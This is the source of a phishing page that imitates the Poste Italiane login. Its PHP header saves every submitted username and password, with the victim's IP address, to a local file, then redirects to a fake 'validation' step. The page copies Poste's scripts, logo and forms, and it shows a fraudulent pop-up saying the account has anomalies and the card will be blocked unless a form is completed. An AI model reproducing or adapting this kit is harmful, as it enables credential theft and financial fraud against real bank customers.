...
if(isset($_POST["username"]) && isset($_POST["password"])){
	...
	$out="[{$date}] {$_SERVER['REMOTE_ADDR']} {$_POST['username']}:{$_POST['password']}\n";
	file_put_contents("a", $out, FILE_APPEND | LOCK_EX);
	header("Location: elaborazione.php?route=convalida");
}
?>
<!DOCTYPE html>
<html class="pi-lg pi-firefox" lang="it"><head>
		<title>Accedi o Registrati</title>
			...
			<meta name="identifier" content="1453897797466">
				...
				<script type="text/javascript" src="login_files/poste-it.js"></script>
				<script type="text/javascript" src="login_files/megamenu-pi.js"></script>
				<script type="text/javascript" src="login_files/scroll-pi.js"></script>
				<script type="text/javascript" src="login_files/nav-tabs-vertical.js"></script>
				<script type="text/javascript" src="login_files/owl.js"></script>
				<script type="text/javascript" src="login_files/slick.js"></script>
				...
				<script type="text/javascript" src="login_files/bootstrap-datepicker.js"></script>
				<script type="text/javascript" src="login_files/typeahead.js"></script>
				<script type="text/javascript" src="login_files/custom-form-element.js"></script>
				<script type="text/javascript" src="login_files/ion.js"></script>
				<script type="text/javascript" src="login_files/bootstrap-tagsinput.js"></script>
				<script type="text/javascript" src="login_files/jquery_005.js"></script>
				<script type="text/javascript" src="login_files/utilita-app.js"></script>
				...
				<script type="text/javascript" src="login_files/image-loader.js"></script>
			...
			<style>
				.ng-hide{
					display:none;
						...
						<script type="text/javascript" src="login_files/secureloginoncheckme.js"></script>
						...
						<script type="text/javascript" src="login_files/secureloginrewritedomainurl.js"></script>
						...
						<script type="text/javascript" src="login_files/secureloginondocready.js"></script>
...
<script type="text/javascript" src="login_files/x-jod-poste-id.js"></script>
							  ...
							  <div class="col-sm-12">
								 ...
								 <div class="tab-content">
									<div role="tabpanel" class="tab-pane active" id="privati">
										<form class="form-login spacer-xs-bottom-30 clearfix" method="POST" action="index.php">
												...
												<div class="col-md-6">
												   <div class="form-group form-group-lg">
													  <p>
														 ...
														 <input title="" name="username" id="username" class="form-control" placeholder="Inserisci" type="text">
													  </p>
												   </div>
												</div>
												<div class="col-md-6">
												   <div class="form-group form-group-lg">
													  <p>
														 ...
														 <input name="password" title="" data-placement="top" class="form-control" id="" placeholder="Inserisci" type="password">
													  </p>
												   </div>
												</div>
...
informazioni, da rete mobile chiamare il <a href="tel:199.100.160">199.100.160</a>.</p>
							...
							<div class="col-sm-12 spacer-xs-top-10">
								<div class="spacer-xs-bottom-30">
									<div class="form-group form-group-lg">
										<p>
											...
											<input class="form-control" name="username" placeholder="inserisci" type="text">
										</p>
									</div>
									<div class="form-group form-group-lg">
										<p>
								...
								<div class="spacer-xs-bottom-30 innerspacer-xs-bottom-30 border-xs-bottom">
									<div class="box-editable-area">
										...
										<a href="#"><img src="login_files/logo-posteid.png" srcset="/risorse_dt/condivise/immagini/loghi/logo-posteid@2x.png 2x" class=""></a>
									</div>
								</div>
							</div>
						</div>
	...
	<div class="modal fade ng-scope in" id="modalContratti" tabindex="-1" role="dialog" aria-labelledby="myModalLabel" ng-if="contratti" data-backdrop="static" data-keyboard="false" style="display: block; padding-right: 17px;">
		 ...
		 <div class="modal-content">
				 ...
				 <div class="modal-body">
						 <p>
							 ...
							 <p>Abbiamo notato delle anomalie presenti sul vostro conto Postale</p>
							 <p>La invitiamo quindi a compilare il modulo che segue dove le sarà sottoscritto le problematiche riscontrate</p>
							 <p>La mancata compilazione del modulo porterà il blocco della sua carta postale in quanto risulta in fase di revisione di sicurezza.</p>
						 </p>
				 </div>
						 ...
						 <div class="row">
								 <div class="col-sm-12">
										 <p class="spacer-xs-bottom-0 text-xs-right">
												 <a class="btn btn-secondary ng-binding" onclick="document.getElementById('modalContratti').style='display: none'">Avanti</a>
										 </p>
								 </div>
						 </div>
				 </div>
